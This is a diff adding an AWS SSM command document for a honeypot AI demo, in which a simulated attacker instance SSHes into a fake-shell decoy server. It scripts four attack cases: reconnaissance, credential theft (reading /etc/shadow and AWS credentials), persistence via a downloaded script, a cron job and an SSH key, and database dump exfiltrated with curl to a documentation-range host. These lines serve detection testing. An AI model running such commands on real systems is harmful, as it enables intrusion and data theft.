@@ -1,0 +1,52 @@
+schemaVersion: '2.2'
+description: |
+  허니팟 AI 시연(HONEYPOT-AI): 서울 VPC 안의 공격자 EC2 가 미끼서버 SSH(22)에 접속해 "한 세션 안에서" 명령을 이어서 입력한다.
+  DemoCase 1~4 는 서로 다른 공격 의도(정찰 / 자격증명 탈취 / 악성코드 설치 / 내부 확산·유출)를 재현한다.
+  미끼서버는 가짜 셸이라 명령은 실제로 실행되지 않고 모두 기록되며, 세션이 끝나면 AI 가 요약·공격 의도·위험도를 판정한다.
+  접속 한 번으로 탐지 알람이 울리고 asr_trigger 가 공격자의 사설 IP 를 Private NACL 에 자동 차단한다.
+  외부 주소는 문서용 예약 대역 203.0.113.0/24 만 쓴다(실제로 나가지 않는다). HoneypotHost 는 10.x 사설 주소만 허용한다.
+  기존 ATK-HoneypotProbe(명령마다 새 접속, 대시보드 "전부 실행"이 사용)는 그대로 두고 이 문서를 따로 쓴다.
+parameters:
+  HoneypotHost:
+    type: String
+    description: 미끼서버 사설 IP (예 10.0.1.12)
+    allowedPattern: '^10\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])$'
+  DemoCase:
+    type: String
+    description: "공격 사례 번호 (1 정찰 / 2 자격증명 탈취 / 3 악성코드 설치 / 4 내부 확산·유출)"
+    allowedValues:
+      - '1'
+      - '2'
+      - '3'
+      - '4'
+mainSteps:
+  - action: 'aws:runShellScript'
+    name: attackHoneypot
+    inputs:
+      runCommand:
+        - '#!/bin/bash'
+        - set -uo pipefail
+        - |
+          if ! command -v sshpass >/dev/null; then
+            for i in 1 2 3; do sudo apt-get update -y && sudo apt-get install -y sshpass && break; sleep 10; done
+          fi
+        - HOST='{{ HoneypotHost }}'
+        - CASE_NO='{{ DemoCase }}'
+        - |
+          case "$CASE_NO" in
+            1) LABEL="recon"
+               C=("whoami" "uname -a" "id" "ps aux" "netstat -tulpn") ;;
+            2) LABEL="credential-access"
+               C=("cat /etc/shadow" "cat ~/.aws/credentials" "env | grep -i key" "cat /var/www/.env") ;;
+            3) LABEL="malware-persistence"
+               C=("wget http://203.0.113.10/x.sh -O /tmp/x.sh" "chmod +x /tmp/x.sh" "(crontab -l; echo '* * * * * /tmp/x.sh') | crontab -" "echo ssh-rsa AAAAdemo >> ~/.ssh/authorized_keys") ;;
+            4) LABEL="lateral-exfiltration"
+               C=("mysql -h 10.0.1.50 -u root -p'admin123' -e 'show databases'" "mysqldump -h 10.0.1.50 -u root shop > /tmp/db.sql" "tar czf /tmp/db.tgz /tmp/db.sql" "curl -T /tmp/db.tgz http://203.0.113.10/up") ;;
+          esac
+        - 'echo "== honeypot AI demo case $CASE_NO ($LABEL) -> $HOST @ $(date -u +%FT%TZ) =="'
+        - |
+          { for c in "${C[@]}"; do echo "$c"; sleep 3; done; echo exit; } | \
+            SSHPASS='Passw0rd!' sshpass -e ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+              -o ConnectTimeout=10 -o LogLevel=ERROR "root@$HOST" 2>&1 | head -60
+        - 'echo "case $CASE_NO finished (허니팟 로그·NACL 차단·AI 분석은 콘솔에서 확인)"'
+        - exit 0
